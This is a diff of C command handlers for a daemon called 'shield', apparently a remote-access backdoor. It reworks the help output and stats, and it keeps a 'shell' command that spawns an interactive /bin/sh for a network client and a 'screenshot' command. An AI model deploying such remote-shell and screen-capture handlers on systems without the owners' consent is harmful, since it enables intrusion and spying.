@@ -14,52 +14,39 @@
 
 #include "cmds/screenshot.inc.cc"
 
-int shield_cmd_help(client_t *client, [[maybe_unused]] daemon_server_t *server, kr_strview_t *cmdline)
+int shield_cmd_help(client_t *client, unused daemon_server_t *server, unused kr_strview_t *line)
 {
-	(void) client, (void) server, (void) cmdline;
-	//TODO: remake in C
-	// if (!args || !*args)
-	// {
-	// 	for (int i = 0; commands[i].command != NULL; ++i)
-	// 	{
-	// 		client->output_buffer.append(commands[i].usage);
-	// 		client->output_buffer.append(": ");
-	// 		client->output_buffer.append(commands[i].description);
-	// 		client->output_buffer.push_back('\n');
-	// 	}
-	// 	return (0);
-	// }
-	//
-	// std::string option;
-	// std::istringstream argstream(args);
-	// argstream >> option;
-	// for (int i = 0; commands[i].command != NULL; ++i)
-	// {
-	// 	if (option == commands[i].command)
-	// 	{
-	// 		client->output_buffer.append("Usage: ");
-	// 		client->output_buffer.append(commands[i].usage);
-	// 		client->output_buffer.push_back('\n');
-	//
-	// 		client->output_buffer.append("Description: ");
-	// 		client->output_buffer.append(commands[i].description);
-	// 		client->output_buffer.push_back('\n');
-	//
-	// 		return 0;
-	// 	}
-	// }
-	//
-	// client->output_buffer.append("Command not found: ");
-	// client->output_buffer.append(option);
-	// client->output_buffer.push_back('\n');
+	kr_strappend(&client->out_buffer, "Available commands:\n");
+	kr_strappend(&client->out_buffer, "-------------------\n");
+	size_t max_size = 0;
+	for (int i = 0; commands[i].command != NULL; ++i)
+	{
+		size_t len = strlen(commands[i].usage);
+		max_size = len > max_size ? len : max_size;
+	}
+	max_size += 2;
+	char space_buf[max_size + 1];
 
-	return (-1);
+	for (int i = 0; commands[i].command != NULL; ++i)
+	{
+		kr_strappend(&client->out_buffer, commands[i].usage);
+		size_t len = strlen(commands[i].usage);
+		if (len < max_size)
+		{
+			memset(space_buf, 0, sizeof(space_buf));
+			memset(space_buf, ' ', max_size - len);
+			kr_strappend(&client->out_buffer, space_buf);
+		}
+
+		kr_strappend(&client->out_buffer, commands[i].description);
+		kr_strappend(&client->out_buffer, "\n");
+	}
+	return (0);
 }
 
 // Summon a shell for the client
-int	shield_cmd_shell(client_t *client, daemon_server_t *server, kr_strview_t *cmdline)
+int	shield_cmd_shell(client_t *client, daemon_server_t *server, unused kr_strview_t *cmdline)
 {
-	(void) cmdline; // unused parameter
 	int master_fd, pid;
 
 	DEBUG("Spawning shell for client %d\n", client->index);
@@ -75,7 +62,8 @@ int	shield_cmd_shell(client_t *client, daemon_server_t *server, kr_strview_t *cm
 		return (1);
 	if (pid == 0)
 	{
-		char *argv[] = {(char *)"sh", NULL};
+		// server_cleanup(server); // this is probably a bad idea lol
+		char *argv[] = {"sh", "-i", NULL};
 		char *envp[] = {NULL};
 		execve("/bin/sh", argv, envp);
 
@@ -109,22 +97,15 @@ int	shield_cmd_shell(client_t *client, daemon_server_t *server, kr_strview_t *cm
 }
 
 int	shield_cmd_screenshot(
-	[[maybe_unused]] client_t *client,
-	[[maybe_unused]] daemon_server_t *server,
-	[[maybe_unused]] kr_strview_t *cmdline
+	client_t *client,
+	unused daemon_server_t *server,
+	unused kr_strview_t *cmdline
 ) {
-	(void) client, (void) server, (void) cmdline;
 	const char *result = shield_screenshot();
+	if (strncmp(result, "ERROR|", 6) == 0)
+		result += 6;
 	kr_strappend(&client->out_buffer, result + 6);
 	kr_strappend(&client->out_buffer, "\n");
-	return (0);
-}
-
-int	shield_cmd_get(client_t *client, daemon_server_t *server, kr_strview_t *cmdline)
-{
-	(void) client; // unused parameter
-	(void) server; // unused parameter
-	(void) cmdline; // unused parameter
 	return (0);
 }
 
@@ -151,6 +132,9 @@ int	shield_cmd_stats(client_t *client, daemon_server_t *server, unused kr_strvie
 	APPEND_STAT("Total bytes received", qio_data.bytes_received);
 	APPEND_STAT("Total bytes sent", qio_data.bytes_sent);
 	APPEND_STAT("Total connections", qio_data.total_connections);
+#if SHIELD_DEBUG
+	kr_strappend(&client->out_buffer, "\nl'IO il est quantifié là ouais 🤙\n");
+#endif // SHIELD_DEBUG
 #undef APPEND_STAT
 	return (0);
 }
